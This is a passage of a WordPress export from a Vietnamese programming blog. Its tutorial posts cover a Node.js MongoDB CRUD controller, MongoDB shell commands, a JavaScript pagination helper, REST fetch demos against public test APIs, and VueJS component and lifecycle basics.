        } catch (e) {
            console.log(e)
            res.json({ error: 'error' })
        }
    }
    trash = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            let result = await collection.find({ removedAt: { $ne: 0 } }).toArray()
            res.json({ data: result })
        } catch (e) {
            console.log(e)
            res.json({ error: 'error' })
        }
    }
    findID = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            let result = await collection.findOne({ _id: new ObjectId(req.params._id) })
            res.json({ data: result })
        } catch (e) {
            console.log(e)
            res.json({ error: 'error' })
        }
    }
    insert = async (req, res, next) => {
        console.log(req.body)
        try {
            let newCollection = {
                ...req.body,
                createdAt: Date.now(),
                updatedAt: Date.now(),
                removedAt: 0,
            }
            let collection = mongoDB.getDB().collection(this.name)
            let result = await collection.insertOne(newCollection)
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    update = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.findOneAndUpdate(
                { _id: new ObjectId(req.params._id) },
                { $set: { ...req.body, updatedAt: Date.now() } },
                { upsert: false, returnDocument: 'after' }
            )
            res.json({ data: result.value })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    replace = async (req, res, next) => {
        try {
            let newCollection = {
                ...req.body,
                createdAt: Date.now(),
                updatedAt: Date.now(),
                removedAt: 0,
            }
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.findOneAndReplace(
                { _id: new ObjectId(req.params._id) },
                newCollection,
                { upsert: false, returnDocument: 'after' }
            )
            console.log(result)
            res.json({ data: result.value })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    remove = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.findOneAndUpdate(
                { _id: new ObjectId(req.params._id) },
                { $set: { removedAt: Date.now() } },
                { upsert: false, returnDocument: 'after' }
            )
            res.json({ data: result.value })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    restore = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.findOneAndUpdate(
                { _id: new ObjectId(req.params._id) },
                { $set: { removedAt: 0, updatedAt: Date.now() } },
                { upsert: false, returnDocument: 'after' }
            )
            res.json({ data: result.value })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    destroy = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.deleteOne({
                _id: new ObjectId(req.params._id),
                removedAt: { $ne: 0 },
            })
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    //
    insert_list = async (req, res, next) => {
        try {
        } catch (error) { }
    }
    remove_list = async (req, res, next) => {
        try {
            let _ids = req.body._ids.map((item) => new ObjectId(item))
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.updateMany(
                { _id: { $in: _ids } },
                { $set: { removedAt: Date.now() } },
                { upsert: false }
            )
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    restore_list = async (req, res, next) => {
        try {
            let _ids = req.body._ids.map((item) => new ObjectId(item))
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.updateMany(
                { _id: { $in: _ids } },
                { $set: { removedAt: 0 } },
                { upsert: false }
            )
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    destroy_list = async (req, res, next) => {
        try {
            let _ids = req.body._ids.map((item) => new ObjectId(item))
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.deleteMany({ _id: { $in: _ids } })
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    destroy_trash = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.deleteMany({ removedAt: { $ne: 0 } })
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
    destroy_all = async (req, res, next) => {
        try {
            let collection = mongoDB.getDB().collection(this.name)
            const result = await collection.deleteMany({})
            res.json({ data: result })
        } catch (error) {
            console.log(error)
            res.json({ error: error })
        }
    }
}
</pre>

<h2>2. Các lệnh thường dùng</h2>
2.1. Copy value to other field tất cả document
<pre>
db.getCollection('tuthuocs').update(
	{},
	[
		{
			$set: {
				'Gia.Nhap': { $arrayElemAt: [ '$HangTon.GiaNhap', 0 ] },
				'Gia.BanLe': '$GiaBan.Le',
				'Gia.BanSi': '$GiaBan.Si',
			},
		},
	],
	{ multi: true }
);
</pre>

2.2. Xóa field tất cả document
<pre>
db.getCollection('tuthuocs').update({}, {$unset: {GiaBan:1}} , {multi: true});
</pre>



2.3. Tạo field tất cả document
<pre>
db.getCollection('tuthuocs').update({}, {$set: {ManagerID: "60ca1e69ecc5460004032c1c"}}, {multi: true});
</pre>

2.* -- Khác
<pre>
//Xóa tất cả document
db.tuthuocs.remove({})
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>971</wp:post_id>
		<wp:post_date><![CDATA[2021-05-07 00:00:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-06 17:00:57]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-07 00:00:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-06 17:00:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-7-nosql-p1-mongodb-controller]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[Pagination - Phân trang trong ES6]]></title>
		<link>https://duycode.com/2021/05/14/pagination-phan-trang-trong-es6/</link>
		<pubDate>Fri, 14 May 2021 03:51:46 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=982</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. List vị trí hiện</h2>
<pre>
pagination = (index, length, delta = 2) => {
	let array = [],
		left = index - delta - 1,
		right = index + delta + 1;
	for (let i = 1; i <= length; i++) {
		if (
			i == 1 ||
			i == length ||
			(i > left && i < right) ||
			(i == 2 && left == 2) ||
			(i == length - 1 && right == length - 1)
		) {
			array.push(i);
		}
	}
	if (left > 2) {
		array.splice(1, 0, '...');
	}
	if (right < length - 1) {
		array.splice(-1, 0, '...');
	}
	return array;
};
</pre>
-- Test thử
<pre>
for (let i = 1, l = 20; i <= l; i++)
    console.log(`Selected page ${i}:`, pagination(i, l));
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>982</wp:post_id>
		<wp:post_date><![CDATA[2021-05-14 10:51:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-14 03:51:46]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:03:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:03:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[pagination-phan-trang-trong-es6]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Cài đặt SCSS]]></title>
		<link>https://duycode.com/2021/06/04/cai-dat-scss/</link>
		<pubDate>Fri, 04 Jun 2021 08:19:28 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1012</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://drive.google.com/uc?export=view&id=1iL5magKZpu3D_oPcB_Iespyb8uMZHwW0" alt="Css hahaha" />
Ở VSCode, cài đặt Extensions: Live Sass Compiler là chạy được luôn
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1012</wp:post_id>
		<wp:post_date><![CDATA[2021-06-04 15:19:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-04 08:19:28]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-04 15:19:28]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-04 08:19:28]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cai-dat-scss]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[RESTful API - 1. Cơ bản]]></title>
		<link>https://duycode.com/2021/06/09/restful-api-1-co-ban/</link>
		<pubDate>Wed, 09 Jun 2021 13:50:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1046</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Các phương thức cơ bản</h2>
<table>
<tbody>
<tr>
<td>Methods</td>
<td>URLs</td>
<td>Actions</td>
</tr>
<tr>
<td>GET</td>
<td>/products</td>
<td>findAll()</td>
</tr>
<tr>
<td>GET</td>
<td>/products?categoryID=123&amp;page=1</td>
</tr>
<tr>
<td>GET</td>
<td>/products/:id</td>
<td>findByID() findOne()</td>
</tr>
<tr>
<td>POST</td>
<td>/products/add</td>
<td>addOne()</td>
</tr>
<tr>
</tr>
<tr>
<td>PATCH</td>
<td>/products/update/:id</td>
<td>updateOne()</td>
</tr>
<tr>
<td>PATCH</td>
<td>/products/remove/:id</td>
<td>removeOne()</td>
</tr>
<tr>
<td>PATCH</td>
<td>/products/restore/:id</td>
<td>restoreOne()</td>
</tr>
<tr>
</tr>
<tr>
<td>PATCH</td>
<td>/products/removeList</td>
<td>removeList()</td>
</tr>
<tr>
<td>PATCH</td>
<td>/products/restoreList</td>
<td>restoreList()</td>
</tr>
<tr>
</tr>
<tr>
<td>PUT</td>
<td>
<div>
<div>/products/replace</div>
</div>
</td>
<td>
<div>
<div>replaceOne()</div>
</div>
</td>
</tr>
<tr>
<td>DELETE</td>
<td>/products/destroy/:id</td>
<td>destroyOne()</td>
</tr>
<tr>
<td>DELETE</td>
<td>/products/destroyList</td>
<td>destroyList()</td>
</tr>
</tbody>
</table>

<h2>2. Demo Fetch</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Resful API</title>
</head>

<body>
    <div>
        <button onclick="getAPI()">Get Users</button>
        <button onclick="postAPI()">Post Login</button>
        <button onclick="putAPI()">Put User</button>
        <button onclick="patchAPI()">Patch User</button>
        <button onclick="deleteAPI()">Delete User</button> <br>

        <button onclick="postAPI2()">Post Login 2</button>
    </div>

    <script>
        const getAPI = async () => {
            try {
                let url = 'https://reqres.in/api/users?page=2';
                let response = await fetch(url);
                console.log(response);
                let responseJSON = await response.json();
                console.log(responseJSON);
            } catch (error) {
                console.log('Failed to fetch data !!!', error.message);
            }
        }

        const postAPI = async () => {
            try {
                let config = {
                    method: 'POST',
                    body: JSON.stringify({ email: "eve.holt@reqres.in", password: "cityslicka", }),
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }
                let url = 'https://reqres.in/api/login';
                let response = await fetch(url, config);
                console.log(response);
                let responseJSON = await response.json();
                console.log(responseJSON);
            } catch (error) {
                console.log('Failed to fetch data !!!', error.message);
            }
        }

        const postAPI2 = async () => {
            try {
                let url = "https://learn-api.jmaster.io:8443/api/login";
                let config = {
                    method: 'POST',
                    headers: new Headers({
                        'Content-Type': "application/x-www-form-urlencoded",
                        'Cookie': "JSESSIONID=B41705BC2C08E0B2A4CF1338348333CE",
                    }),
                    body: new URLSearchParams({
                        'username': '0123456789',
                        'password': '123456',
                    }),
                    redirect: 'follow'
                };
                let response = await fetch(url, config);
                console.log(response);
                let responseJSON = await response.json();
                console.log(responseJSON);
            } catch (error) {
                console.log('Failed to fetch data !!!', error.message);
            }
        }

        const putAPI = async () => {
            try {
                let config = {
                    method: 'PUT',
                    body: JSON.stringify({ name: "James", job: "Student", }),
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }
                let url = 'https://reqres.in/api/users/2';
                let response = await fetch(url, config);
                console.log(response);
                let responseJSON = await response.json();
                console.log(responseJSON);
            } catch (error) {
                console.log('Failed to fetch data !!!', error.message);
            }
        }

        const patchAPI = async () => {
            try {
                let config = {
                    method: 'PUT',
                    body: JSON.stringify({ name: "Robert", job: "Farming", }),
                    headers: {
                        'Content-Type': 'application/json',
                    },
                }
                let url = 'https://reqres.in/api/users/2';
                let response = await fetch(url, config);
                console.log(response);
                let responseJSON = await response.json();
                console.log(responseJSON);
            } catch (error) {
                console.log('Failed to fetch data !!!', error.message);
            }
        }

        const deleteAPI = async () => {
            try {
                let config = {
                    method: 'DELETE',
                }
                let url = 'https://reqres.in/api/users/2';
                let response = await fetch(url, config);
                let responseJSON = await response.json();
                console.log(response);
                console.log(responseJSON);
            } catch (error) {
                console.log('Failed to fetch data !!!', error.message);
            }
        }
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1046</wp:post_id>
		<wp:post_date><![CDATA[2021-06-09 20:50:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 13:50:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-09 20:50:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 13:50:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[restful-api-1-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mongodb"><![CDATA[MongoDB]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Component: 2. Send Data giữa component 'cha' và 'con']]></title>
		<link>https://duycode.com/2021/06/10/vuejs-component-2-send-data-giua-component-cha-va-con/</link>
		<pubDate>Wed, 09 Jun 2021 21:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1106</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Tổng quan</h1>
<h2>1. Gửi dữ liệu từ Component-cha sang Component-con</h2>
<pre>
//Component cha dùng "v-bind" vào thẻ component con để gắn data gửi đi
<ChildComponent :child_receive="parent_send"></ChildComponent>

//Component con nhận bằng "prop"
props: {
    child_receive: {
        type: String,
        required: false,
        default: "Nothing !!!"
    }
},
</pre>

<h2>2. Gửi dữ liệu từ Component-con về Component-cha</h2>
<h3>2.1. Cách 1: Dùng event</h3>
a. Component con truyền data bằng "$emit"
<pre>
//Kích hoạt sự kiện gửi về paren bằng button
<button @click="sendParent">Send To Parent</button>

//Param 1 là tên sự kiện: "takeOnChild"
//Param 2 là data gửi đi: "this.child_send"
methods: {
    sendParent() {
        console.log("Start Child Send To Parent !!!");
        this.$emit("takeOnChild", this.child_send);
        console.log("End Send Parent !!!");
    }
}
</pre>
b. Component cha kích hoạt event bằng "v-on", nhận dữ liệu thông qua biến "$event" trong hàm sự kiện
<pre>
//TH1: Nhận trực tiếp biến event
<ChildComponent @takeOnChild="parent_receive = $event"></ChildComponent>

//TH2: Nhận thông qua methods
<ChildComponent @takeOnChild="receiveOnChild"></ChildComponent>

//Sau đó đọc biến "$event" bằng "parameter" của hàm, trường hợp này là biến data
methods: {
    receiveOnChild(data) {
        console.log("Parent take Data from Child");
        this.parent_receive = data;
    }
},
</pre>
<h3>2.2. Cách 2: Dùng callback funtion</h3>
a. Component cha gửi callback về cho component con
<pre>
//Component cha dùng function callback để set dữ liệu
methods: {
    callbackParent(data) {
        this.parent_receive = data;
    }
},

//Component cha dùng "v-bind" vào thẻ component con để gắn funtion gửi đi
<ChildComponent :child_callback="callbackParent"></ChildComponent>
</pre>

b. Component con nhận function callback
<pre>
//Nhận function callback thông qua props
props: {
    child_callback: {
        type: Function,
    }
},

//Set data cho paren thông qua params của funtion callback
<button @click="child_callback(child_send)">Send To Parent By Callback</button>
</pre>

<h1>II. Demo</h1>
<h2>1. Tại Component cha</h2>
-- Tại file ./src/components/ParentComponent.vue
<pre>
<template>
    <div>
        <input type="text" v-model="parent_send" />
        <p>Parent Send: {{ parent_send }}</p>
        <p>Parent Receive: {{ parent_receive }}</p>
        <ChildComponent
            :child_receive="parent_send"
            :child_callback="callbackParent"
            @takeOnChild="receiveOnChild"
        ></ChildComponent>
        <!-- <ChildComponent @takeOnChild="parent_receive = $event"></ChildComponent> -->
    </div>
</template>

<script>
import ChildComponent from "./ChildComponent.vue";
export default {
    data: function() {
        return {
            parent_send: "123",
            parent_receive: "0"
        };
    },
    methods: {
        receiveOnChild(data) {
            console.log("Parent take Data from Child");
            this.parent_receive = data;
        },
        
        callbackParent(data) {
            this.parent_receive = data;
        }
    },
    components: {
        ChildComponent: ChildComponent
    }
};
</script>
<style scoped></style>

</pre>


<h2>2. Tại Component con</h2>
-- Tại file ./src/components/ChildComponent.vue
<pre>
<template>
    <div>
        <hr />
        <input type="text" v-model="child_send" />
        <button @click="sendParent">Send To Parent</button>
        <button @click="child_callback(child_send)">Send To Parent By Callback</button>
        <p>Child Send: {{ child_send }}</p>
        <p>Child Receive: {{ child_receive }}</p>
    </div>
</template>

<script>
export default {
    props: {
        child_receive: {
            type: String,
            required: false,
            default: "Nothing !!!"
        },
        child_callback: {
            type: Function,
        }
    },
    data: function() {
        return {
            child_send: "xyz"
        };
    },
    methods: {
        sendParent() {
            console.log("Start Child Send To Parent !!!");
            this.$emit("takeOnChild", this.child_send);
            console.log("End Send Parent !!!");
        },
    }
};
</script>
<style scoped></style>

</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1106</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 04:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 21:00:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 04:00:56]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 21:00:56]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-component-2-send-data-giua-component-cha-va-con]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Tổng quan và cài đặt]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-tong-quan-va-cai-dat/</link>
		<pubDate>Wed, 09 Jun 2021 17:00:33 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1114</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><em>*** Tổng quan :</em></strong>
<em>-- Có 2 cách chính để sử dụng Vue:</em>
1. Dùng ở client, sử dụng VueJS dạng <strong>script tag</strong>
<pre><script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script></pre>
2. Dùng trong môi trường server
* Lợi ích của dùng server:
- Chạy trên môi trường thực tế, dùng dạng https://blabla.com
- Gọi từng phần component, template -> giảm kích cỡ file trong dự án -> optimize hệ thống hơn

<h1>I. Dùng ở Client</h1>
-- Một ví dụ đơn giản dùng Vue dạng CDN như sau:
<pre>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>VueJS Demo</title>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
    </head>
    <body>
        <div id="app">
            <h2>{{objDemo.title}}</h2>
            <div>
                <button v-on:click="hasBgClass = !hasBgClass">
                    Toggle Class
                </button>
                <button v-on:click="isShow = !isShow">
                    <span v-if="isShow == true">Toggle Hide</span>
                    <span v-else>Toggle Show</span>
                </button>
                <button @click="price+=1000">Price+1000</button>
            </div>
            <div>
                <ul v-bind:class="{bg_brown: hasBgClass}">
                    <li v-for="(item, index) in arrDemo">
                        {{index}} : {{item}}
                    </li>
                </ul>
                <ul v-show="isShow">
                    <li v-for="(item, key) of objDemo">{{key}} : {{item}}</li>
                </ul>
                <p>Giá tiền: {{price | formatVND}}</p>
            </div>
            <input type="text" v-model="objDemo.title" />
            <p>{{say('Word')}}</p>
        </div>
    </body>
    <script>
        var app = new Vue({
            el: "#app",
            data: {
                arrDemo: ["Samsung", "Oppo", "Vsmart", "Xiaomi"],
                objDemo: {
                    title: "Project VueJS Demo",
                    count: 22,
                    address: "New York"
                },
                price: 10000,
                hasBgClass: true,
                isShow: true
            },
            methods: {
                say: function(text) {
                    return "Hello " + text;
                }
            },
            filters: {
                formatVND: function(numbers) {
                    return numbers
                        .toFixed(3)
                        .replace(/\d(?=(\d{3})+\.)/g, "$&,");
                }
            }
        });
    </script>
    <style>
        .bg_brown {
            background-color: green;
            color: white;
        }
    </style>
</html>

</pre>

<h1>II. Dùng ở môi trường server</h1>
<h2>1. Cài NodeJS và npm</h2>
- Download và cài đặt: https://nodejs.org/en/download/
- Khi cài NodeJS sẽ mặc định bao gồm cả npm luôn
- Kiểm tra version <strong>node</strong> và <strong>npm </strong>bằng terminal của VSCode
<blockquote>
node -v
npm -v
</blockquote>

<h2>2. Lựa chọn Module bundler</h2>
Có một số lựa chọn thường gặp
- Simple: index.html + Vue CDN import
- webpack-simple: Basic webpack workflow -> sử dụng chính
- webpack: Complex webpack workflow(incl. testing)
- browserify / browserify-simple

<h2>3. Cài đặt Vue</h2>
3.1. Cài đặt vue/cli
<blockquote>
//Cài đặt vue-cli
npm i -g @vue/cli-init

//Kiểm tra sau cài đặt
vue --version
vue -V
</blockquote>

3.2. Cài đặt webpack
<blockquote>
//Cài đặt webpack với folder demoVuejs
vue init webpack-simple demoVuejs
//Điền thông tin project, author ....
</blockquote>

3.3. Dùng webpack để khởi chạy project
<blockquote>
cd demoVuejs
npm install
npm run dev
</blockquote>

3.4. Dùng webpack để build project
<blockquote>
npm run build
</blockquote>
-- Thư mục dist được tạo ra, chứa file js gốc để chạy :3



<h1>III. Cài đặt VScode</h1>
<h2>1. Cài đặt extensions for VScode</h2>
-- Vetur

<h2>2. Snippets></h2>
-- Vào File > Preferences > User snippets > New Global snippets file ...
-- Điền tên File và nội dung như sau
<pre>
{
	"Default Vue": {
		"scope": "vue",
		"prefix": ["vue", "cvue"],
		"body": [
			"<template>",
			"\t<div>",
			"\t\t$0",
			"\t</div>",
			"</template>",
			"",
			"<script>",
			"export default {",
			"\tdata() {",
			"\t\treturn {",
			"\t\t\t",
			"\t\t}",
			"\t},",
			"",
			"\tmethods: {",
			"\t\t",
			"\t},",
			"}",
			"</script>",
			"",
			"<style scoped>",
			"\t",
			"</style>"
		],
		"description": "Demo file Vue "
	}
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1114</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 00:00:33]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 17:00:33]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 00:00:33]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 17:00:33]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-tong-quan-va-cai-dat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Component: 1. Khởi tạo Component]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-component-1-khoi-tao-component/</link>
		<pubDate>Wed, 09 Jun 2021 20:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1120</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Khởi tạo Component</h2>
-- VD ở dưới sử dụng Vue dạng CDN, gọi các component và instance của Vue trực tiếp trong thẻ "script"
<pre>
<!DOCTYPE html>
<html lang="en">
    <body>
        <div id="app1">
            <local_component></local_component>
            <local_component></local_component>
        </div>
        <div id="app2">
            <globa_component></globa_component>
            <globa_component></globa_component>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <script>
            let component_object = {
                data: function() {
                    return {
                        text: "This is create by Component"
                    };
                },
                template: "<div><p>{{text}}</p></div>"
            };

            //Component dạng Local
            let app1 = new Vue({
                el: "#app1",
                components: {
                    local_component: component_object
                }
            });

            //Component dạng Global
            Vue.component("globa_component", component_object);
            let app2 = new Vue({
                el: "#app2"
            });
        </script>
    </body>
</html>

</pre>

<h2>2. Demo file ComponentVue.vue</h2>
-- VD ở dưới sử dụng Vue ở server, có sử dụng webpack, mỗi component tách ra thành mỗi file có đuôi .vue riêng biệt

<pre>
<template>
    <div id="app">
        <h1>Contact Page</h1>
        <datacontact-component />
    </div>
</template>

<script>
import DataContact from "./DataContact.vue";
export default {
    components: {
        "datacontact-component": DataContact
    }
    data: function (){
        return {
            address: '12 New Yor - USA'
        }
    },
    methods: {
        changePhone(){
            this.address = '12 Kim Mã, HN';
        }
    }
};
</script>

<style scoped>

</style>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1120</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 03:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 20:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 03:00:00]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 20:00:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-component-1-khoi-tao-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Lifecycle Vue & Lifecycle Component]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-lifecycle-vue-lifecycle-component/</link>
		<pubDate>Wed, 09 Jun 2021 18:00:33 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1133</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Lifecycle trong Vue</h2>
<pre>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Lifecycle Vue</title>
    </head>

    <body>
        <div id="app">
            <h2>Hello Vue !!!</h2>
            <p>Updated: {{current_time}}</p>
            <button @click="current_time = new Date()">
                Update Data
            </button>
            <button @click="destroyVue">Destroy Vue</button>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <script>
            let app = new Vue({
                el: "#app",
                data() {
                    return {
                        current_time: "Not yet"
                    };
                },
